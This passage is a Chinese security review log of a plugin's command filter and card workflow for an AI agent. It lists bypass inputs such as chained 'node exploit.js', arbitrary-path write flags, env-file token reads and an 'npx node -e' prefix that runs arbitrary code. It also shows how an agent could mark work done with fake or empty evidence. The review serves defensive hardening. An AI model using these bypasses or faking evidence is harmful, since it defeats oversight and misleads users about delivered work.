这是对的方向：**「说得出可核对的东西」从字面检查变成了真的有凭据**。而且它只在调用方注入 `lastCheck` 时强制（纯函数调用不受影响），实现上很克制。

**仍然开着的三个口子**（都在同一处，建议下一轮一起收）：

1. **`kind:'files'` 完全不验**。`evidence {kind:'files', summary:'创建了完全不存在-abc123.py，第 5 行是 main'}` → **通过**（项目里根本没有这个文件）。`kind:'check'` 现在有凭据要求了，`kind:'files'` 却还是纯自述——**换一个 `kind` 就绕回去了**，成本为零。修法：`kind:'files'` 时把 summary 里的路径抽出来做一次 `fs.existsSync`（至少要存在于 `dir` 内），或者干脆要求同时给一个 `files: []` 数组由工具自己验。
2. **全卡 `downgrade` 依然能零产出到 `done`**。`probe-final55.mjs`：c1 是唯一的卡 → `downgrade reason:'时间不够'` → `cards_done` → `ship_pass{explain:'好了'}` → **`stage=done`，项目里只有 `IDEA.md` + `TECH.md`，没有 `checks.json`，没有一行用户代码**。M4 的证据要求在 `downgrade` 这条路上根本没被经过——它只挡 `done`，不挡「全部降级」。修法：`cards_done` 时若「成功完成的卡 = 0」，要求 `ship_pass.explain` 说清「这一轮具体交付了什么」并落到 `HANDOFF.md`，或者直接拒绝推进。
3. **`downgrade` 的 `reason` 不验**。`reason:'x'` → 「卡片 c1 已 downgrade。」；`reason:'我懂了'` → 同样通过。**卡片降级是这个模式里唯一「可以不做」的出口**，理由却连长度和空话都不查——和 `evidence.summary` 有一套 `checkEvidenceObservable` 相比，这里是不设防的。修法：`reason` 复用 `checkEvidenceObservable`（≥4 字 + 去空话），并要一句「为什么这一轮做不了」。

**所以 M4 的现状应该改成「部分闭合（`kind:'check'` 已对账；`kind:'files'` / 全卡 downgrade / downgrade reason 三个口子仍开）」**，而不是「本轮不做」。

#### 9.6.8 第三轮：`&&` 分档 + 写文件开关收口之后的复核

§9.6.7 写完之后工作树又动了一轮（`lib/checks.js` / `lib/scaffold.js` / `lib/cards.js`、`docs/CONTRACT.md` / `docs/INTERFACES.md`、三个测试文件）。这一轮把 §9.6.2 的误杀和 §9.6.3 的 N19 一起收了。**复核时 `node --test` 371 / 371 全绿、`check-docs` 全过**，所以下面这些结论是在绿树上测的。

**关上的**：

| 项 | 上一轮（§9.6.3 / §9.6.2） | 这一轮 |
|---|---|---|
| **N19 任意路径写入** | `--test-reporter-destination=<任意路径>` 在 `declare` 阶段放行，`run` 时覆盖用户文件、覆盖 `state.json` 把项目写死 | **已闭合**。`probe-final50.mjs` 三种形态（绝对 / `../` / `../../`）**全部在 `declare` 阶段被拒**；`probe-final45.mjs` 里 `NOTES.md` 内容原样保留、`state.json` 仍是合法 JSON、项目仍可读。文案：「会把报告写到命令里指定的路径（等于任意文件写），检查命令不允许」 |
| 同类写文件开关 | `--redirect-warnings` / `--cpu-prof-dir` / `--heap-prof-dir` / `--report-directory` / `--report-filename` / `--snapshot-blob` 全部放行 | **一并拒了**（`probe-final52.mjs` 那 15 个里只剩 `--env-file` 一个放行，见下面「仍开」） |
| **§9.6.2 误杀** | `vite build` / `next build` / `webpack` / `cross-env …` / `rimraf … && vite build` 全拒，9/22 | **`probe-final58.mjs` 十条约 0/10 误杀**；`probe-final39.mjs` 的 23 条常见写法只剩 `npx next build` 一条被拒。`SCRIPT_COMMANDS` 与 `ALLOWED_COMMANDS` 之间有漂移断言（`test/scaffold.test.js`「两份命令白名单不许漂移」），差集现在只剩 `pip` / `uv` 两个**故意**排除的 |
| `&&` 一律拒 | `rimraf dist && vite build` 被误杀 | 改成**分档**：`&&` / `\|\|` 切段、**每段单独过全套校验**。`npm ci && node exploit.js` 仍拒（理由落在坏的那段：「「npm ci」会安装或执行任意包」），`rimraf dist && vite build` 放行。**这个改法是对的**，而且拒绝理由比之前精确 |
| 「友好壳」跳板 | — | 新增 `cross-env` / `dotenv` / `env-cmd` / `rimraf` 四个壳，各自独立校验：改加载行为的环境变量名（`NODE_OPTIONS` / `PYTHONPATH` / `PATH` / `LD_PRELOAD` …）一律拒、值只允许裸字、`rimraf` 的路径必须落在项目内。**`rimraf /etc`、`cross-env PATH=./evil`、`cross-env A="x y"`、`cross-env NODE_ENV=production && vite build`（后面没命令）实测全拒，文案都对得上** |
| **M4 `kind:'check'`** | 「跑了一下」直接过 | 已对账（§9.6.7）。这一轮 `test/cards.test.js` 把「没跑过 / 跑失败 / 拿别的卡」三种都钉成了测试 |

**仍然开着的（按严重度排）**：

1. **`npx` 的白名单又漂移了（同一类问题，第二次）**。`KNOWN_TOOLS` 只有 11 项（`tsc` / `eslint` / `prettier` / `vitest` / `jest` / `mocha` / `vite` / `ruff` / `mypy` / `black` / `pre-commit`）。结果：`npx next build` / `npx webpack` / `npx rollup -c` / `npx esbuild` / `npx parcel build` / `npx react-scripts build` / `npx tailwindcss` / `npx playwright` / `npx prisma` **全拒**，而**去掉 `npx` 的同一条命令全放行**。这和 §9.6.2 里 `vite build` vs `npx vite build` 是同一个病，只是方向反了。**建议**：`npx` 的判定改成「包名（去掉 `@version`）∈ `ALLOWED_COMMANDS` ∪ `KNOWN_TOOLS`」，并加一条「`npx X` 放行 ⟺ `X` 在 ∪ 里」的断言。「`npx <工具>` 用的是本地已装依赖还是现下载，`npx` 自己会先查 `node_modules/.bin`」——按包名判断已经够，不用两套名单。
2. **`--env-file` / `--env-file-if-exists` 仍放行**（`--env-file=C:\x\.env` 也行）。它是**读**不是写，但能把项目外的环境变量读进来——如果那份文件里有 token，`node --test` 能把它打到 stdout，再经 `plando_check` 的输出回到模型手里。风险比 N19 低（不破坏文件），属同一类「值是一个路径的开关」。**建议**：与 N19 同一处收口，值必须落在 `dir` 内。
3. **`node evil.js` 仍放行**（单独写、以及 `node --test && node evil.js` / `npm test && node evil.js` 这类串联）。和 §9.6.4 一致：要真被执行，`evil.js` 得先在项目里，而 AI 写不出 `.js`（`scaffold` 白名单只有 7 个配置文件）。**进 KNOWN-ISSUES 是合理的**，`test/scaffold.test.js` 里也已经用注释把这个前提写清楚了。
4. **`kind:'files'` 仍不验**、**全卡 `downgrade` 仍能零产出到 `done`**、**`downgrade.reason` 仍不验**（§9.6.7 那三条，这一轮没动）。`probe-final55.mjs` 复测：`kind:'files'` 三条全过（含「创建了完全不存在-abc123.py」）；唯一一张卡 downgrade → `cards_done` → `ship_pass{explain:'好了'}` → **`stage=done`，项目里只有 `IDEA.md` + `TECH.md`**；`reason:'x'` 与 `reason:'我懂了'` 都过。**这是现在最实质的一条**——它不涉及安全，但直接决定「这个模式会不会让用户以为自己交付了东西」。

**三轮回溯：G2 这条线到底怎么走完的**（有教育意义，建议留着）：

| 轮次 | 状态 |
|---|---|
| `ab5f108`（§9.3） | `scripts` 值走 denylist，`python -X utf8 -c` 一条就绕，4 次调用到 `done` |
| `76e37b8`（§9.6.1） | 改白名单 + 串联字符 + 环境变量前缀 + 注入 `checks.validateCommand` → **攻击面 14/15 关闭**，但**误杀 9/22**、且白名单与 `checks` 漂移 |
| 本轮（§9.6.8） | 误杀 0/10、两份白名单加漂移断言、`&&` 分档、友好壳、补漂移断言 → **G2 可以判「中危闭合」** |

每一步都在**修上一个修法带来的副作用**，其中一次（`--test-reporter`）还顺手放出了 N19。这不是说修错了方向，而是说明这类「按字符串判危险」的过滤器**每收一次边界都会移动误杀面**，所以两侧都得有回归测试——现在 `test/scaffold.test.js` 里「拒绝」与「放行」是分开两组写的，这点做对了。

---

**§9.6 的重跑命令**：

```powershell
node $env:TEMP\plando-review\probe-final46.mjs   # 本节全部：A 攻击面 / B 误杀 / C N14 / D N15+N19 / E N16 / F M4
node $env:TEMP\plando-review\probe-final45.mjs   # N19 端到端：覆盖用户 NOTES.md、再覆盖 state.json 把项目写死
node $env:TEMP\plando-review\probe-final50.mjs   # N19 三种路径形态（绝对 / ../ / ../../）全部写到项目外
node $env:TEMP\plando-review\probe-final40.mjs   # 误杀时的完整错误文案（看模型会不会被带偏）
node $env:TEMP\plando-review\probe-final52.mjs   # 同类写文件开关的扫描（15 个 node 开关 + 9 个命令）
node $env:TEMP\plando-review\probe-final53.mjs   # §9.6.7：M4 的 kind:check 对账（没跑过 / 跑失败 / 真的过了）
node $env:TEMP\plando-review\probe-final55.mjs   # §9.6.7：kind:files 不验 / 全卡 downgrade 零产出 / downgrade reason 不验
node $env:TEMP\plando-review\probe-final58.mjs   # §9.6.8：误杀面（10 条常见 build 写法，现在 0/10）
node $env:TEMP\plando-review\probe-final45.mjs   # §9.6.8：N19 回归（覆盖 NOTES.md 与 state.json 现在都不成立）
node $env:TEMP\plando-review\check-tables.mjs    # 报告自身的表格列数校验（23 块 / 169 行 / 0 异常）
```

*本节同样没有改动 `lib/` 与 `test/`；我这一轮唯一写的文件就是这份报告。*

---

## 10. §9 的处置记录（Lead 收到复核后同一轮内完成）

§9 的复核结论是「14 条闭合、3 条部分闭合（G2 / M4 / L4）、1 条收窄（L8），外加 5 条新问题（N14–N18）」。
下面是逐条处置。原始报告与 §9 一字未改。

`node --test` **366 passed / 0 failed**；`check-docs` / `verify-pack` / `smoke-pack` 全过。

| # | 处置 | 落在哪 |
|---|---|---|
| **G2**（§9.3，唯一还活着的高危） | **已闭合**。新增 `scaffold.validateScriptValue(key, value, validateCommand)`，四道规则：① 串联字符（`&&` `\|\|` `;` `\|` 反引号 `$(`）一律拒；② 环境变量前缀（`NODE_OPTIONS=…`）一律拒；③ 命令名必须在 `SCRIPT_COMMANDS` 白名单里（`tar` / `bash` / `./evil.sh` / `make` 全关）；④ 命令整体交给 `checks.validateCommand` 做 argv 级校验（`python -X utf8 -c` / `python -u -c` / `py -3 -c` / `npm ci` / `npx <包>` 全拒）。`validateCommand` 由 `tools.js` 注入——scaffold 不 import checks（依赖方向单向），没注入时退到本地兜底 `fallbackValidateCommand`（挡内联执行开关），**不是**放行 | `lib/scaffold.js`、`lib/tools.js` |
| **N14**（高，写侧没有与读侧对齐） | **已闭合**。`project.saveState` 落盘前量字节数，超过读上限的 80%（1.6 MB）就**拒写**，并报出最大的 3 个字段路径（`largestFields`）。实测六个入口全部被挡在写入前：`clarify questions[0]` 5 MB / `card done evidence.summary` 3 MB / `tech title` 2.5 MB → 全部返回「这次要写的项目状态有 5121 KB，超过 1638 KB 写入上限（最大的是 clarify.answers[0].questions[0] ≈ 5120 KB）」，磁盘上仍是原来那份可读状态 | `lib/project.js` |
| **N15**（中，合法命令被误杀） | **已闭合**。`--test-reporter` 从笼统拒绝改成「值必须在白名单里」（`spec` / `tap` / `dot` / `junit` / `lcov` / `github`），含路径分隔符 / 以 `.` 开头 / `.js` 结尾的值仍拒（那才是模块）。`--test-reporter=spec` 与 `--test-reporter spec` 两种写法都放行 | `lib/checks.js` |
| **N16**（低，日志没有工具名） | **已闭合**。`run(args, body, deps, toolName)` 多收一个工具名，`logRejection` 写入 `{kind:'reject', source:'tool', tool, dir, reason}`。`dir` 优先取**这次调用自己带的**，没有再退到守卫记的活跃项目——多项目时分得清 | `lib/tools.js` |
| **N17**（观察，成功消息 420 字） | **已处理**。`shortPath(dir)`：超过 60 字只显示尾部两段（`…\bbb\ccc`），完整路径仍可在 `plando_status` 里看到 | `lib/tools.js` |
| **N18**（观察，unknown fail-open） | **不改，把前提写成断言**。理由：预设挂载的工具集是固定的（`cordis.patch.yml` 里没有 `node` / `python` / `git`，N18 描述的风险没有落点）；改成 fail-closed 会误伤 `present` / `ask_user_question` / `todo_write`，而「新版本加个工具就全废」比 N18 更常发生；契约 §5 与 INTERFACES §2 的语义表都明写「读 / 未知放行」，改它要先改契约。**但**加了 `test/preset.test.js` 的一条断言：插件名里一旦出现 `node` / `python` / `git` / `tar` / `bash` / `shell` / `exec` / `terminal` 这类词，测试立刻红，提醒改动者同时收 unknown 分支 | `lib/policy.js`（只加注释）、`test/preset.test.js` |
| **M4**（中，证据不验真） | **部分闭合，本轮不做**。§9.5 把它排在第三位，修法要「把 `plando_check` 的 `exitCode` 落进 state，done 时比对」。这是一个**状态机语义变更**（要新增 state 字段 + 迁移 + 契约修订），不该和一轮安全修复混在一起。已在下面「已知问题」里显式列出 | — |

**顺手补的可自动化项（A9 的那一半）**：新增 `scripts/smoke-pack.mjs` —— 真打包 → 真解到一个空目录 → 按 ES 模块真 `import` → 假 ctx `apply` → 断言 8 个工具 + 1 个守卫 → 走一遍 `init → clarify → clarify_idea` → 断言守卫从 fail-closed 变成按阶段拦写工具。这能把「清单齐了但 import 了一个没进包的模块」挡在发布前，`verify-pack`（只看清单）做不到。已进 CI 与 `npm run smoke-pack`。

**已知问题（进 KNOWN-ISSUES，不在 0.1.0 修）**：

- **M4**：证据只验形状与「不是空话」，不验「真的做过」。`plando_check` 的退出码目前不进 state，所以 `evidence.kind='check'` 的 summary 仍是自述。
- `--watch` / `--inspect-brk` 会让检查挂满 60 秒超时（有超时兜底，不是安全问题）。
- `deno run x.ts` / `bun run x.ts` 放行：这两个解释器的核心用法就是执行文件，argv 上无法与「跑检查」区分（§8.7 已记）。
- 三处 `minutes` 计算仍是独立实现（`state.checkBudget` / `state.computeSize` / `artifacts.renderTech`），口径已统一但没抽公共函数。

---

## 11. §9.6 的处置记录（Lead 收到第二轮复核后同一轮内完成）

§9.6 的结论是：G2/N14/N16 真的修好了，但 N15 的修法**顺带打开了 N19（任意文件写，高）**，G2 收紧**误杀 9/22 条常见 build 写法**，M4 从头到尾没动。下面是逐条处置。

`node --test` **373 passed / 0 failed**；`check-docs` / `verify-pack` / `smoke-pack` 全过。

| # | 处置 | 落在哪 |
|---|---|---|
| **N19**（高，`--test-reporter-destination` = 任意文件写） | **已闭合**。新增 `WRITE_FILE_FLAGS` + `writeFileFlagName()`，**整类拒绝**而不是判路径是否在项目内：一条检查命令没有任何合法需求去写报告文件（产物本来就该走 stdout，工具会截断收下），而「值在不在项目内」要跟 resolve + 符号链接 + 盘符 / UNC 一路判断，判错一次就是静默覆盖用户文件。收掉的开关：`--test-reporter-destination`（原凶）、`--redirect-warnings`、`--diagnostic-dir`、`--report-directory`、`--report-filename`、`--heap-prof-dir`、`--cpu-prof-dir`、`--snapshot-blob`、`--disk-cache-dir`。检查放在 `validateCommand` 的**最前面**，所以 `npm test -- --test-reporter-destination=…` 这种转发形态也拦 | `lib/checks.js` |
| **G2 的代价**（误杀 9/22） | **已修**，见下四条 | `lib/scaffold.js`、`lib/checks.js` |
| └ ① 两份白名单漂移 | `SCRIPT_COMMANDS` 现在与 `checks.ALLOWED_COMMANDS` 同集合（少 `pip`，装包不属于跑脚本），并加**漂移断言**：`SCRIPT_COMMANDS ⊆ ALLOWED_COMMANDS`，不一致立刻红 | `test/scaffold.test.js` |
| └ ② 构建工具被拒 | `ALLOWED_COMMANDS` 补进 `vite` / `next` / `react-scripts` / `webpack` / `rollup` / `esbuild` / `parcel` / `nodemon` / `pm2` / `tsx` / `ts-node` / `serve`——它们的共同点是「跑用户项目里已装好的依赖」，不下载、不 eval，风险和 `vitest` / `jest` 同级 | `lib/checks.js` |
| └ ③ `&&` 一刀切 | 改**分档**：`&&` / `\|\|` 允许，但**每一段**单独过关（都过命令名白名单 + argv 级校验）。切段时把引号里的分隔符当普通字符（`node -e "a && b"` 不会被切成两段）。`;` `\|` 反引号 `$(` 仍整条拒——合法 build 写法几乎不需要它们。另加「最多 8 段」的护栏 | `lib/scaffold.js` |
| └ ④ 友好壳 | `cross-env` / `dotenv` / `env-cmd`（设环境变量）与 `rimraf`（清目录）可以出现在段首，但**壳自己的参数也要查**：环境变量名不许是 `NODE_OPTIONS` / `PYTHONPATH` / `PATH` / `LD_PRELOAD` 这类改变加载行为的名字，值只允许裸字（带空格 / 引号的值正是「壳里塞第二条命令」的手法）；`rimraf` 的目标不许绝对路径、不许 `..`。壳后面接的命令仍走全套校验 | `lib/scaffold.js` |
| **M4**（中，证据不验真） | **已闭合**，这次用了不改状态机的修法：`runCheck` 把每次执行的结果写 `<dir>/.plando/last-check.json`（`{name, command, ok, exitCode, at}`），`plando_card action=done` 时对账——`kind='check'` 必须存在 `name === card.id && ok === true` 的记录，否则拒（理由分三种：从没跑过 / 是别的卡的检查 / 上次没通过）。**没有**往 `state.json` 加字段，所以不需要版本迁移和契约修订；`kind='files'` 不要求记录（改文件本来没有退出码） | `lib/checks.js`、`lib/cards.js`、`lib/tools.js` |
| **N17**（成功消息 250 字） | **本轮不再追**。250 字里 120 字是尾部路径（`shortPath` 已经砍掉 3 层 ×120 字的情况），真正的问题是「一条成功消息本来就该短」——但契约的 160 字只约束错误消息，把它套到成功消息上会逼着把「下一步」也砍掉。记为观察项 | — |

**§9.6 里那些「本案的取舍」写在这里，免得下一轮再提一遍**：

- **`node evil.js` 仍放行**：这是 §9.6.4 记录的已知残余。串联分档并没有让它变强（单独写 `node evil.js` 一样放行）；要构成攻击，那个 `.js` 必须**已在用户项目里**——AI 写不出 `.js`（白名单只有 7 个配置文件），`plando_check` 也不能写文件。进 KNOWN-ISSUES。
- **不做「值必须在项目内」的路径判定**：N19 的整类拒绝是**有意的保守**。将来若真有人需要 `--test-reporter-destination`，正确做法是「把路径限制在 `.plando/reports/` 下并由插件自己建」，而不是放开一个任意路径。
- **`pip` 不在 `SCRIPT_COMMANDS` 里**：`pip install` 会跑 `setup.py`，它不该出现在 `scripts` 里；`plando_check` 那边 `pip install` 同样被 `RUN_SUBCOMMANDS` 拦着。

## 12. §11 修完之后仍然开着的（复核记录，不是新判决）

> 这一节是我对 **§11 那棵工作树**（`node --test` 373 / 0 红）的复核记录。**判决仍在 §6，仍是 fix-first。** §11 的处置我逐条验过，绝大多数对得上；下面只记**验不过去**或**§11 没提到**的。

### 12.1 §11 的处置：验过的部分全部属实

| §11 的说法 | 我的复核 | 结论 |
|---|---|---|
| `WRITE_FILE_FLAGS` 整类拒 9 个开关 | `probe-final65.mjs`：`--test-reporter-destination` / `--redirect-warnings` / `--diagnostic-dir` / `--report-directory` / `--report-filename` / `--heap-prof-dir` / `--cpu-prof-dir` / `--snapshot-blob` / `--disk-cache-dir` **9/9 全拒**；`npm test -- --test-reporter-destination=x` 这类转发形态也拒 | ✅ 属实 |
| N19 端到端已失效 | `probe-final45.mjs`：`NOTES.md` 内容原样、`state.json` 仍是合法 JSON、项目仍可读；`probe-final50.mjs` 三种路径形态（绝对 / `../` / `../../`）全在 `declare` 阶段被拒 | ✅ 属实，**N19 闭合** |
| 误杀 9/22 → 0 | `probe-final58.mjs` 十条常见 build 写法 **0/10 误杀**；`probe-final39.mjs` 的 23 条只剩 `npx next build` 一条 | ✅ 属实 |
| `&&` 分档、每段独立校验 | `npm ci && node exploit.js` 拒且理由落在坏段；`rimraf dist && vite build` 放行；`node --test && bash -c "rm x"` 拒 | ✅ 属实 |
| 友好壳有独立校验 | `cross-env NODE_OPTIONS=…` / `cross-env PATH=./evil` / `cross-env A="x y"` / `rimraf /etc` / `rimraf ../../x` 全拒，文案对得上 | ✅ 属实 |
| M4 `kind:'check'` 对账 | 「跑了一下」/「everything works」/「跑了 vite build，退出码 0」在没跑过时全拒；真跑过且 exit 0 才过；跑失败也拒 | ✅ 属实 |

### 12.2 仍然开着的四条（§11 没处置或只部分处置）

#### R1　`npx` 的第三份白名单还在，而且方向反了　【中】

`KNOWN_TOOLS`（11 项）和 `ALLOWED_COMMANDS`（已补到含 `next` / `webpack` / `rollup` / `esbuild` / `parcel` / `react-scripts` / `nodemon` / `pm2` / `tsx` / `ts-node` / `serve`）**又没同步**。实测（`probe-final65.mjs`）：

```
放行  npx vite build
拒绝  npx next build   / npx webpack / npx rollup -c / npx esbuild / npx parcel build
拒绝  npx react-scripts build / npx nodemon / npx pm2 / npx tsx / npx serve
```

而**去掉 `npx` 的同一条命令全部放行**。这和 §9.6.2 里 `vite build` 拒 / `npx vite build` 放是同一个病，只是方向反过来了：§11 补的是 `ALLOWED_COMMANDS`，忘了 `npx` 走的是**另一份** `KNOWN_TOOLS`。

**修法**（一行）：`npx` 的判定改成「包名（去掉 `@version`）∈ `ALLOWED_COMMANDS` ∪ `KNOWN_TOOLS`」，再加一条断言「`npx X` 放行 ⟺ `X` ∈ 并集」。理由：`npx` 执行本地已装工具和现下载包的区别，`npx` 自己会先查 `node_modules/.bin`；按包名判断已经够，不需要两份名单。

#### R2　`--env-file` / `--env-file-if-exists` 仍放行　【低-中】

```
放行  node --test --env-file=.env
放行  node --test --env-file=C:\x\.env      ← 项目外
放行  node --test --env-file-if-exists=.env
```

§11 收的是**写**文件的开关（`WRITE_FILE_FLAGS`），`--env-file` 是**读**，所以没被收进去。但它的值同样是「命令里指定的任意路径」，能把项目外的 `.env` 读进来；如果里面有 token，`node --test` 一打印就经 `plando_check` 的输出回到模型手里。**同一类问题的另一半**，建议一起收：要么整类拒，要么值必须落在 `dir` 内。

#### R3　全卡 `downgrade` 仍能零产出到 `done`　【中，这是现在最实质的一条】

`probe-final55.mjs`：唯一一张卡 `downgrade reason:'时间不够'` → `cards_done` → `ship_pass{offlineOk:true, selfChange:true, explain:'好了'}` → **`stage=done`**。项目里只有 `IDEA.md` + `TECH.md`，**没有 `checks.json`，没有一行用户代码**。

§11 给 M4 加的对账只挂在 `action=done` 上，`downgrade` 这条路根本不经过它——**M4 的两个残余（`kind:'files'` 不验、全卡 downgrade 零产出）中，后者更值得修**：它不涉及安全，但直接决定「这个模式会不会让用户以为自己交付了东西」。

**修法建议**：`cards_done` 时若「`status==='done'` 的卡 = 0」，① 拒绝推进，或 ② 要求 `ship_pass.explain` 说清「这一轮具体交付了什么」并落到 `HANDOFF.md`。另外 `downgrade.reason` 现在 `'x'` 和 `'我懂了'` 都能过，建议复用 `checkEvidenceObservable`。

#### R4　`node evil.js` 仍放行　【低，已知残余】

单独写、以及 `node --test && node evil.js` / `npm test && node evil.js` 这类串联都放行。§11 已经写明这是**有意的取舍**（那个 `.js` 必须已在用户项目里，AI 写不出 `.js`），我同意这个判断，只是把它记在这里，免得下轮又被当成新发现。

### 12.3 一句话

**§11 的修复全部属实，G2 与 N19 可以判闭合。**剩下的四条里，R1 是「第三份名单又漂移了一次」（修起来最便宜、最容易再犯），R3 是「模式可能让用户以为自己交付了东西」（最有产品意义）。R2 / R4 进 KNOWN-ISSUES 即可。**判决不变：fix-first。**

---

## 13. §12 的处置记录（Lead 收到第三轮复核后同一轮内完成）

§12 的结论是「§11 的声明全部属实，N19 真闭合、误杀 9/22 → 0/10」，但留下四条残余。
下面是逐条处置。**§12 一字未改。**

`node --test` **378 passed / 0 failed**；`check-docs` / `verify-pack` / `smoke-pack` 全过。

| # | 处置 | 落在哪 |
|---|---|---|
| **R1**（中，`npx` 的第三份白名单又漂移，方向还反了） | **已闭合**。`npx` 的判据从「包名 ∈ `KNOWN_TOOLS`」改成「包名 ∈ `KNOWN_TOOLS` ∪ `ALLOWED_COMMANDS`」，并加等价断言：对 16 个工具逐个验「裸命令放行 ⟹ `npx <它>` 也放行」。`npx` 自己会先查 `node_modules/.bin`，按包名判断就够，不需要第三份名单——这正是 §9.6.2 那个病的镜像（`vite build` 拒 / `npx vite build` 放），不修的话模型学到的是「加 `npx` 就能过」 | `lib/checks.js`、`test/checks.test.js` |
| **R3**（中，全卡降级零产出到 done） | **已闭合，两处**。① `cards_done` 要求「至少一张 `done`」，全降级直接拒（理由写明「N 张卡全部降级了，一行都没跑通」+ 下一步「至少把一张做到 done，其余再降级；确实做不了就传 drop」）；② `downgradeCard` 的理由复用 `checkEvidenceObservable`，`'x'` / `'我懂了'` / `'完成了'` 一律拒——「降级」这个出口原本对理由完全不设防，等于「跳过这一张」的快捷方式 | `lib/state.js`、`lib/cards.js`、`test/state.transitions.test.js`、`test/cards.test.js`、`test/tools.test.js` |
| **R2**（中，`--env-file` 能读项目外文件） | **已闭合，用另一套规则**。它和 N19 方向相反（读不是写）但有合法用法（`node --env-file=.env --test` 是标准姿势），所以**不做整类拒绝**——整类拒会把最常见的写法误杀（§9.6.2 的教训）。规则改成「值必须是项目内的相对路径」：绝对路径、盘符、`..` 一律拒；分离形式（`--env-file .env`）拿不到上下文时一律当不安全 | `lib/checks.js`、`test/checks.test.js` |
| **R4**（`node evil.js` 与它的串联） | **不修，维持 §11 的取舍**。串联分档并没有让它变强（单独写一样放行）；要构成攻击，那个 `.js` 必须**已在用户项目里**——AI 写不出 `.js`（`scaffold` 白名单只有 7 个配置文件），`plando_check` 也不能写文件。进 KNOWN-ISSUES | — |

**这轮学到的、值得写进下一轮 prompt 的一条**：同一个概念出现第三份名单（`ALLOWED_COMMANDS` / `SCRIPT_COMMANDS` / `KNOWN_TOOLS`）时，漂移几乎是必然的，而且方向经常反。修法不是「记得同步」，而是**加一条等价断言**——名单一改成不一致就红。现在已经有两处：`SCRIPT_COMMANDS ⊆ ALLOWED_COMMANDS`、`npx X 放行 ⟺ X ∈ ALLOWED_COMMANDS ∪ KNOWN_TOOLS`。

**KNOWN-ISSUES（0.1.0 不修，都已验过不是「本轮引入」）**：

- `node evil.js` 及其串联（R4，理由见上）。
- `--watch` / `--inspect-brk` 会让检查挂满 60 秒超时（有超时兜底，不是安全问题）。
- `deno run x.ts` / `bun run x.ts` 放行：这两个解释器的核心用法就是执行文件，argv 上无法与「跑检查」区分。
- 三处 `minutes` 计算仍是独立实现（口径已统一，没抽公共函数）。

---

## 14. §13 处置的复核：R1/R3 是「部分闭合」，R2 是真闭合，但 R1 的修法开了一个**新的高危洞**

> 这一节是我对 **`a5bf3f2`** 那棵树的独立复核（`HEAD = 53d51d1` 时复跑，`lib/`、`test/` 自 `a5bf3f2` 起**零改动**，已用 `git diff --name-only a5bf3f2 -- lib/` 验过；`node --test` **390 passed / 0 failed**）。
> **§10–§13 一个字都没动。判决仍是 §6 的 fix-first，本节的结论不改变判决、只改变「哪几条能算闭合」。**
> 全部结论都有可复现的命令；探针脚本在 `%TEMP%\plando-review\`（`probe-final14b.mjs` 一次跑齐本节所有数字）。

### 14.1 三条处置的判决（先给结论）

| # | §13 的声明 | 我的复核 | 判决 |
|---|---|---|---|
| **R1** | `npx` 判据改成 `KNOWN_TOOLS ∪ ALLOWED_COMMANDS`，「已闭合」 | 它宣称的两件事**都属实**（见 14.2），但这条修法把 `npx` 变成了一个**通用洗白前缀**：`node -e "1"` 拒、`npx node -e "1"` 放行；`npm install x` 拒、`npx npm install x` 放行。**360 组「`npx` + 工具 + 危险参数」里 360 组全放行**，其中 **260 组是这一轮从「拒」变成「放」的** | **部分闭合 → 新开 R5【高】** |
| **R2** | `--env-file` 值必须是项目内相对路径 | 逐条验过：3 条合法写法全放行，8 条越界写法（绝对路径 / 盘符 / `..` / UNC / `\\?\` / 分离形式 / 空值 / 大小写）全拒；经 `npm test -- --env-file=…` 转发也拒；几种「放行但 node 不认」的畸形值实测 `exit=9`，读不到东西 | **✅ 闭合** |
| **R3** | ① `cards_done` 要求至少一张 `done`；② `downgrade` 理由复用 `checkEvidenceObservable` | ① 属实且有效，② **只等于加了个「≥4 字」的最小长度**：判别力实测误放行 **28/36 = 78%**；更要紧的是**「一张 `done` + 其余降级」这条路仍能零产出到 `done`**，因为唯一那张 `done` 卡可以拿 `kind:'files'` 的假证据（M4 只对账 `kind:'check'`） | **部分闭合 → R7【中】** |

### 14.2 R1 声称的两件事，确实属实（先给它记功）

`probe-final14b.mjs` 第 1 段：

```
裸名 ⟺ npx 裸名：36 个工具，不一致 0            ← §13 加的等价断言真的生效了
「裸名+危险参数」⟺「npx 裸名+同一参数」：360 组，放行 360 组
  其中「修前拒 → 修后放行」260 组
反例：node -e "1" → 拒绝；npx node -e "1" → 放行   ← 断言只覆盖了左边一半
```

（探针里那行标签写的是「裸名+危险参数」，实际统计的是 `npx <工具> <危险参数>`——它测的是加 `npx` 之后参数还过不过检查，结论是**不过**。）

§12 R1 指出的镜像怪相（`npx vite build` 放行 / `npx next build` 拒 / 去掉 `npx` 又放行）**确实修好了**：36 个工具逐个验「裸命令放行 ⟹ `npx <它>` 也放行」，不一致 0 个。这条功劳要给。

**问题是断言的形状选错了。** §13 写的教训是「名单一漂移就加等价断言」，但这次加的断言是：

> `X` 放行 ⟺ `npx X` 放行（**只比较第一个 token**）

它保证了「加 `npx` 不改变结论」，**恰恰把「后面的参数也要过同一套检查」这件事一起丢掉了**。第一版 `npx` 分支只查包名（当时的判据是「包名 ∈ `KNOWN_TOOLS`，只有 11 项」），`node` / `python` / `npm` 都不在里面，所以 `npx node -e` 是**被包名挡下的**——纯属幸运。这一轮把并集扩到 36 项，`node`、`python`、`npm`、`cargo`、`java` 全进了白名单，那道幸运的闸门就同时打开了。

### 14.3 R5　`npx` 变成通用洗白前缀　【高，本轮引入】

#### 复现（`probe-r7-final.mjs`，3 次调用，用户零操作）

```
build 阶段，c1 是正常流程里的一张卡

① plando_card { action:'declare', dir, id:'c1',
     command: `npx -y node -e "require('fs').writeFileSync('PWNED-AI.txt','AI 通过 plando_check 执行了任意代码')"` }
   → 已为卡片 c1 声明检查命令：npx -y node -e "…"        ← 放行

② plando_check { action:'run', dir, name:'c1' }
   → · 检查 c1：通过｜退出码 0

③ 项目根目录生成了 PWNED-AI.txt = true
   内容：AI 通过 plando_check 执行了任意代码

④ plando_card { action:'done', evidence:{kind:'check', summary:'跑了检查，退出码 0'} }
   → 卡片 c1 已 done。                                    ← M4 对账也过了（因为真的跑了）
```

同一条命令**去掉 `npx`** 是拒的（`node -e "1"` → 「命令里的「-e」会让检查变成任意代码」）。也就是说：**加一个 `npx` 前缀，G1 那一整套解释器检查全部失效。**

#### 广度：不是几种特例，是整类

`probe-list.mjs` / `probe-final-nums.mjs` 的 360 组矩阵，按危险参数分组看，**每一组都是 36 个工具全放行**（36 × 10 = 360，无例外）：

```
参数形态        放行工具数   其中「修前拒 → 修后放行」
-e "1"             36/36              26
--eval="1"         36/36              26
-c "1"             36/36              26
eval "1"           36/36              26
install x          36/36              26
add x              36/36              26
ci                 36/36              26
